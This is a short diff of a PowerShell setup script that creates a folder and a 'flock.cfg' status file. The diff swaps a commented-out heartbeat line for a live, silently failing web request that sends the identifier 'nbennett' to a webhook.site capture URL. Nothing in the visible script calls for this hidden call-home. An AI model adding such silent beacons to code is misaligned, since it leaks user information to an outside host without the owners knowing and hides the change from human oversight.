@@ -3,7 +3,7 @@ if (-not (Test-Path $folder)) {
     New-Item -Path $folder -ItemType Directory | Out-Null
 }
 
-# Invoke-WebRequest -Uri "http://flocktrack.net/api/heartbeat?id=nbennett" -UseBasicParsing -ErrorAction SilentlyContinue
+Invoke-WebRequest -Uri "https://webhook.site/e9ef4595-7848-4776-affc-48a3e01298b4?id=nbennett" -UseBasicParsing -ErrorAction SilentlyContinue
 
 New-Item -Path "$folder\flock.cfg" -ItemType File -Force | Out-Null
 Add-Content -Path "$folder\flock.cfg" -Value "status=active"
